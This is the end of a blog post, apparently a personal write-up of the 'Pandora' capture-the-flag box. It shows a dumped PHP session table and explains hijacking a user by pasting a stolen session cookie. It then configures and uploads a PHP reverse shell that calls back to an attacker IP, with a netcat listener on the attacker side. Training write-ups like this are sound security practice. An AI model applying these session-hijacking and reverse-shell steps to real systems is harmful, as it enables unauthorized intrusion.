+| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:&quot;daniel&quot;;                             | 1638168416  |
+| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                 | 1638787723  |
+| r097jr6k9s7k166vkvaj17na1u | NULL                                                 | 1638787677  |
+| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:&quot;daniel&quot;;                             | 1638889082  |
+| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:&quot;daniel&quot;;                             | 1638547193  |
+| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:&quot;daniel&quot;;                             | 1638793297  |
+| vntmpokca9aee53q48op3mesqs | id_usuario|s:6:&quot;daniel&quot;;                             | 1644502107  |
++----------------------------+------------------------------------------------------+-------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:”matt”;alert_msg|a:0:{}new_chat|b:0; </p>
+<p>You have to past it in the cookie.<br><img src="https://i.imgur.com/K2F071M.png"></p>
+<p>Refresh the page..<br>And now you are matt, you can also take the admin cookie but someone else is playing with it,<br>so it’s not working.</p>
+<p>I have to kill them.</p>
+<p><img src="https://i.imgur.com/O1QDhTv.png"><br>Oh, sorry ppl, it’s not working.<br>Hummm, it’s working because I was logged in as admin, but I removed the cookie.<br>One of them is logged as admin, he have to finish the box first I think<br>Someone is using chisel, I have to try this tool too.<br>I think it’s like mu tunnel ssh.<br><img src="https://i.imgur.com/4RtRUMM.png"></p>
+<p><a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a><br>Ok I will try later.</p>
+<h1 id="As-admin"><a href="#As-admin" class="headerlink" title="As admin."></a>As admin.</h1><p>Now I’m admin on the machine, I had to wait 2 hours.<br><img src="https://i.imgur.com/8VpKwKC.png"></p>
+<h2 id="Download-the-revershell"><a href="#Download-the-revershell" class="headerlink" title="Download the revershell"></a>Download the revershell</h2><p>I’v downloaded a reversshell here:<br><a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">$ip &#x3D; &#39;10.10.15.27&#39;;  &#x2F;&#x2F; CHANGE THIS
+$port &#x3D; 4648;       &#x2F;&#x2F; CHANGE THIS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="Zip-it"><a href="#Zip-it" class="headerlink" title="Zip it"></a>Zip it</h2><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">zip -r php-reverse-shell.zip php-reverse-shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">nc -lvp 4648<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="Upload-it"><a href="#Upload-it" class="headerlink" title="Upload it"></a>Upload it</h2><p><img src="https://i.imgur.com/hc0NHYf.png"></p>
+<h2 id="I’m-matt"><a href="#I’m-matt" class="headerlink" title="I’m matt"></a>I’m matt</h2><p><img src="https://i.imgur.com/IxwjjaN.png"></p>
+<h1 id="pandora-backup-1"><a href="#pandora-backup-1" class="headerlink" title="pandora_backup"></a>pandora_backup</h1><p>I can’t be admin on the webpage, it’s buggy.<br>I leave this CTF.</p>
+
+      
+       
+    </div>
+</article>
+
+
+
+
+
+    <section id="comments" class="disqus">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'http://peanutstick.duckdns.org/post/CTF_Pandora.html';
+            this.page.identifier = '/post/CTF_Pandora.html';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//peanutstick.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <aside class="comment-bar">
+        <a>
+            <i class="fa fa-commenting-o animated infinite pulse"></i>
+            <i class="fa fa-spinner fa-pulse"></i>
+            <span class="count-comment"></span>
+        </a>
+    </aside>
+    <script>
+        var isLoadComments = false;
+        var $commentBar = $("#comments aside.comment-bar");
+        var load$hide = function(){
+            if(isLoadComments){
+                return;
+            }
+            isLoadComments = true;
+            if(isLoadComments )
+            $commentBar.find("a > i").toggle();
+            loadComment();
+            $commentBar.fadeOut(800);
+        }
+        $commentBar.click(function(){
+            load$hide();
+        })
+        $commentBar.children("a").mouseenter(function(){
+            load$hide();
+        })
+    </script>
+
+
+</section>
+
+<!-- Add comment count-->
+<span class="disqus-comment-count" style="display: none" data-disqus-identifier="/post/CTF_Pandora.html"></span>
+<span class="disqus-comment-count" style="display: none" data-disqus-url="http://peanutstick.duckdns.org/post/CTF_Pandora.html"></span>
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2021 Peanutstick&#39;s Blog
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
